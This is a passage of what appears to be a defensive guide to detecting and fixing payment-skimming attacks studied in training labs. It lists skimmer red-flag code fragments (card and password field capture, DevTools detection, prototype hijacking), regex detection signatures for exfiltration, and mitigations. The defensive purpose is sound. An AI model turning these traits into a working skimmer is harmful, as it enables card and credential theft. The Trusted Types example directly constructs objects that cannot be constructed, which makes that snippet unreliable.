// RED FLAG: Collecting sensitive fields
data.cardNumber, data.cvv, data.expiry,
data.password, data.ssn, data.bankAccount

// RED FLAG: Adding metadata for tracking
metadata: {
  url: window.location.href,
  timestamp: Date.now(),
  userAgent: navigator.userAgent,
  sessionId: generateSessionId()
}
```

#### 5. **Stealth Techniques**
```javascript
// RED FLAG: Delayed initialization
setTimeout(initSkimmer, 500)

// RED FLAG: Conditional execution
if (isTargetSite) { enableStealthMode() }

// RED FLAG: DevTools detection
if (window.outerHeight - window.innerHeight > 160) {
  pauseMonitoring()
}

// RED FLAG: Property manipulation
Object.defineProperty(element, 'style', { get: () => {...} })

// RED FLAG: Prototype hijacking
Element.prototype.addEventListener = function(...) {...}
```

#### 6. **Memory Management Patterns**
```javascript
// RED FLAG: Large data buffers
dataBuffer = [], capturedData = {}

// RED FLAG: Data queue for transmission
transmissionQueue.push(...)

// RED FLAG: Cleanup on unload
window.addEventListener('beforeunload', () => {
  transmitFinalData()
})
```

---

## DETECTION SIGNATURES BY TOOL

### Browser DevTools Detection

**Network Tab Indicators:**
1. POST requests to suspicious endpoints
2. Multiple requests to same endpoint in short time
3. Unusual domain names mixed with legitimate traffic
4. Base64-encoded data in query parameters

**Console Indicators:**
1. Log messages containing 'SKIMMER', 'COLLECT', 'EXFILTRATE'
2. Configuration objects with C2 URLs
3. Debug logs showing field values
4. Keystroke or clipboard capture logs

**Elements Panel:**
1. Zero-sized hidden elements (Labs 02A, 02B)
2. Negative z-index containers
3. Opacity: 0 with visibility: hidden
4. Elements with `data-` attributes for tracking

**Sources Panel:**
1. Multiple IIFE blocks in same file
2. Prototype modifications in global scope
3. Event listener overrides
4. Large extracted data structures

### Static Code Analysis Signatures

```regex
// Payment field targeting
/input\[.*?(card|cvv|cvc|exp|routing|account)/

// C2 endpoint patterns
/exfil|collect|beacon|command|control|c2/

// Data exfiltration
/(fetch|XMLHttpRequest|Image|sendBeacon).*POST/

// Stealth keywords
/(shadow|stealth|hide|obfuscate|evade|detect)/

// Timing evasion
/setTimeout.*[0-9]{2,}|setInterval.*[0-9]{3,}/
```

### Dynamic Analysis Signatures

1. **Hook `fetch()` and `XMLHttpRequest`:**
   ```javascript
   const originalFetch = window.fetch
   window.fetch = function(url, options) {
     console.log('FETCH:', url, options)
     return originalFetch(url, options)
   }
   ```

2. **Monitor DOM modifications:**
   ```javascript
   const originalCreateElement = document.createElement
   document.createElement = function(tag) {
     const elem = originalCreateElement.call(this, tag)
     if (tag === 'div') {
       console.log('Creating div:', elem)
     }
     return elem
   }
   ```

3. **Watch form submissions:**
   ```javascript
   const forms = document.querySelectorAll('form')
   forms.forEach(form => {
     const originalSubmit = form.submit
     form.submit = function() {
       console.log('Form submitting:', new FormData(this))
       return originalSubmit.call(this)
     }
   })
   ```

---

## REMEDIATION RECOMMENDATIONS

### For Each Attack Type

**LAB 01 - Basic Magecart:**
1. File Integrity Monitoring (FIM) for JavaScript files
2. Content Security Policy (CSP) to restrict exfiltration endpoints
3. Subresource Integrity (SRI) for external scripts
4. Code review automation for suspicious patterns

**LAB 02 - DOM Skimming:**
1. Shadow DOM usage monitoring and restriction
2. Prototype pollution detection
3. MutationObserver usage auditing
4. Anti-debugging mechanism detection
5. Property descriptor override blocking

**LAB 03 - Extension Hijacking:**
1. Extension manifest verification
2. Background script monitoring
3. Content script isolation
4. Permission auditing
5. Source code analysis of extensions

### General Mitigations

1. **Content Security Policy (CSP)**
   ```
   script-src 'self'; 
   connect-src 'self' https://trusted-api.com;
   default-src 'self'
   ```

2. **Trusted Types**
   ```javascript
   if (window.trustedTypes) {
     const policy = trustedTypes.createPolicy('default', {
       createHTML: (string) => new TrustedHTML(string),
       createScript: (string) => new TrustedScript(string),
       createScriptURL: (string) => new TrustedScriptURL(string)
     })
   }
   ```

3. **Form Field Monitoring (Defensive)**
   ```javascript
   // Monitor for suspicious listeners
   const form = document.querySelector('form')
   const listeners = getEventListeners(form)
   if (listeners.submit.length > 1) {
     console.warn('Multiple submit listeners detected')
   }
   ```

---

## SUMMARY TABLE: DETECTION PATTERNS BY CATEGORY

| Category | Lab 01 | Lab 02A | Lab 02B | Lab 03 |
|----------|--------|---------|---------|--------|
| **File Injection** | YES | NO | NO | NO |
| **Form Monitoring** | YES | YES | YES | YES |
| **Keystroke Logging** | NO | YES | YES | YES |
| **Shadow DOM** | NO | YES | NO | NO |
| **Prototype Pollution** | NO | YES | NO | NO |
| **MutationObserver** | NO | YES | YES | NO |
| **Clipboard Access** | NO | NO | NO | YES |
| **Cookie Harvesting** | NO | NO | NO | YES |
| **LocalStorage Access** | NO | NO | NO | YES |
| **Extension Privileges** | NO | NO | NO | YES |
| **DevTools Detection** | NO | YES | NO | NO |
| **Network POST** | YES | YES | YES | YES |
| **sendBeacon** | YES (fallback) | YES (fallback) | YES (fallback) | YES |
| **Obfuscation** | LOW | MEDIUM | MEDIUM | VERY HIGH |
| **Detection Difficulty** | EASY | HARD | MEDIUM | VERY HARD |

---

## CONCLUSION

Each lab demonstrates distinct attack patterns:

- **Lab 01** teaches basic file-based injection and form hijacking - the foundation of skimming attacks
- **Lab 02** demonstrates advanced DOM manipulation and stealth techniques through Shadow DOM abuse
- **Lab 03** shows how legitimate trust can be weaponized through extension hijacking

Security professionals should focus detection efforts on:
1. Monitoring JavaScript file integrity changes
2. Detecting form field listeners with unusual behavior
3. Identifying Shadow DOM creation and modification
4. Auditing extension permissions and behavior
5. Implementing CSP and Trusted Types
6. Using Network monitoring to catch exfiltration attempts

The progression from Lab 01 → Lab 02 → Lab 03 represents the evolution of attacks becoming increasingly sophisticated and harder to detect through visual inspection alone.
